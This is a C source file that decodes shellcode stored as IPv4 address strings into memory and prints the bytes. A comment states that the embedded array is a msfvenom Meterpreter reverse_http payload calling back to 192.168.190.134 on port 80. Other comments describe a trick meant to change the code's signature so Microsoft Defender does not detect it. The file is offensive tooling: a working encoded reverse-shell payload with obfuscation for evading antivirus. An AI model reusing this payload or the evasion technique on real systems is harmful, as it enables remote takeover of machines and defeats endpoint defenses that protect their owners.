#include <Windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

// read array of shellcode formatted as IPv4 addresses
// https://gitlab.com/ORCA000/hellshell/-/blob/main/IPv4Fuscation/Ipv4Fuscation.cpp
// https://infosecwriteups.com/the-art-of-obfuscation-evading-static-malware-detection-f4663ae4716f

// compile: 
//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2ipv4.c /link /OUT:bin2ipv4.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// Define our ustring struct
struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

int DecodeIPv4Fuscation(const char* IPV4[], void * LpBaseAddress, int arrSize) {
	// Defender will detect this function if we don't do something to change the signature
	// Write some output to the NULL device
	FILE* outfile = fopen("nul", "w");
	
	PCSTR Terminator = NULL;
	void * LpBaseAddress2 = NULL;
	NTSTATUS STATUS;
	int i = 0;

	for (int j = 0; j < arrSize; j++) {
		LpBaseAddress2 = ((ULONG_PTR)LpBaseAddress + i);
		if (RtlIpv4StringToAddressA((PCSTR)IPV4[j], TRUE, &Terminator, LpBaseAddress2) != STATUS_SUCCESS) {
			printf("[!] RtlIpv4StringToAddressA failed for %s result %x", IPV4[j], STATUS);
			return 1;
		}
		else {
			i = i + 4;
			fputs("out", outfile);
		}

		fclose(outfile); // close the decoy file

	}
	return 0;
}

int main(void) {
	// Shellcode as array of IP Addresses
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
	// python3 bin2ip.py -v 4 -i met.bin
	

	const char* IPv4s[] = {
  "252.72.131.228", "240.232.204.0", "0.0.65.81", "65.80.82.72", "49.210.101.72",
  "139.82.96.72", "139.82.24.72", "139.82.32.81", "86.72.15.183", "74.74.72.139",
  "114.80.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65",
  "1.193.226.237", "82.72.139.82", "32.139.66.60", "65.81.72.1", "208.102.129.120",
  "24.11.2.15", "133.114.0.0", "0.139.128.136", "0.0.0.72", "133.192.116.103",
  "72.1.208.68", "139.64.32.73", "1.208.139.72", "24.80.227.86", "72.255.201.65",
  "139.52.136.77", "49.201.72.1", "214.72.49.192", "172.65.193.201", "13.65.1.193",
  "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73",
  "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.65.88",
  "65.88.72.1", "208.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82",
  "255.224.88.65", "89.90.72.139", "18.233.75.255", "255.255.93.72", "49.219.83.73",
  "190.119.105.110", "105.110.101.116", "0.65.86.72", "137.225.73.199", "194.76.119.38",
  "7.255.213.83", "83.232.112.0", "0.0.77.111", "122.105.108.108", "97.47.53.46",
  "48.32.40.87", "105.110.100.111", "119.115.32.78", "84.32.49.48", "46.48.59.32",
  "87.105.110.54", "52.59.32.120", "54.52.41.32", "65.112.112.108", "101.87.101.98",
  "75.105.116.47", "53.51.55.46", "51.54.32.40", "75.72.84.77", "76.44.32.108",
  "105.107.101.32", "71.101.99.107", "111.41.32.67", "104.114.111.109", "101.47.49.51",
  "49.46.48.46", "48.46.48.32", "83.97.102.97", "114.105.47.53", "51.55.46.51",
  "54.0.89.83", "90.77.49.192", "77.49.201.83", "83.73.186.58", "86.121.167.0",
  "0.0.0.255", "213.232.16.0", "0.0.49.57", "50.46.49.54", "56.46.49.57",
  "48.46.49.51", "52.0.90.72", "137.193.73.199", "192.80.0.0", "0.77.49.201",
  "83.83.106.3", "83.73.186.87", "137.159.198.0", "0.0.0.255", "213.232.75.0",
  "0.0.47.117", "119.68.105.89", "82.78.114.99", "109.122.79.55", "77.95.117.112",
  "115.65.66.80", "119.106.95.108", "110.105.107.52", "56.55.95.71", "97.66.50.83",
  "77.116.101.49", "108.106.88.102", "68.80.116.57", "57.70.98.116", "81.65.88.53",
  "113.86.98.49", "82.105.65.84", "74.79.110.113", "118.120.117.45", "0.72.137.193",
  "83.90.65.88", "77.49.201.83", "72.184.0.2", "40.132.0.0", "0.0.80.83",
  "83.73.199.194", "235.85.46.59", "255.213.72.137", "198.106.10.95", "83.90.72.137",
  "241.77.49.201", "77.49.201.83", "83.73.199.194", "45.6.24.123", "255.213.133.192",
  "117.31.72.199", "193.136.19.0", "0.73.186.68", "240.53.224.0", "0.0.0.255",
  "213.72.255.207", "116.2.235.204", "232.85.0.0", "0.83.89.106", "64.90.73.137",
  "209.193.226.16", "73.199.192.0", "16.0.0.73", "186.88.164.83", "229.0.0.0",
  "0.255.213.72", "147.83.83.72", "137.231.72.137", "241.72.137.218", "73.199.192.0",
  "32.0.0.73", "137.249.73.186", "18.150.137.226", "0.0.0.0", "255.213.72.131",
  "196.32.133.192", "116.178.102.139", "7.72.1.195", "133.192.117.210", "88.195.88.106",
  "0.89.73.199", "194.240.181.162", "86.255.213.144" };
	
	// declare a variable for our shellcode size
 	unsigned int shellcode_size = (sizeof(IPv4s) / sizeof(IPv4s[0])) * 4;
	
	// Declare a buffer for storing our shellcode
	PVOID buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	
    // Decode IPs and copy into memory
    if (DecodeIPv4Fuscation(&IPv4s, buffer, sizeof(IPv4s) / sizeof(IPv4s[0])) != 0) {
            return -1;
    }

	// create a new struct from the buffer we allocated
	_data.Buffer = buffer;
	_data.Length = shellcode_size;
	
	int idx = 0;
	while ( idx < _data.Length)
	{
		if (idx == (shellcode_size - 1) )
		{
			printf("0x%02x ", _data.Buffer[idx]);
		}
		else
		{
			printf("0x%02x, ", _data.Buffer[idx]);
		}
		idx++;
	}

    return 0;
}

